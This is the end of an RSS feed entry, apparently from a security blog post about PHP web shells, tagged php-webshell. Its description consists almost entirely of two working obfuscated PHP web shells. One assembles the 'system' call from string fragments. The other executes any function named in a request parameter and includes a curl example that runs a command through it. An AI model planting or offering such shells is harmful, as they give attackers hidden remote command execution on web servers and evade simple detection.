UniSh3ll-IV 1  &amp;lt;?=$a=&amp;#34;sy&amp;#34;;$b=&amp;#34;stem&amp;#34;;$c=$a.$b; $c(&amp;#34;uname -a&amp;#34;); //get method    UniSh3ll-V 1  &amp;lt;?=$_[]=@(($ក=@$_REQUEST).($😘=@$ក[0]).($😘($ក[1]))); //curl -v &amp;#39;127.0.0.1:8080/unish3ll.php?0=system&amp;amp;1=la+-la&amp;#39;    </description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="http://localhost:1313/images/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>php-webshell</category>
            
          
        
        
          
            
              <category>WebShell</category>
            
          
        
        
          
            
              <category>WebApp</category>
            
          
        
      </item>
      

    
  </channel>
</rss>
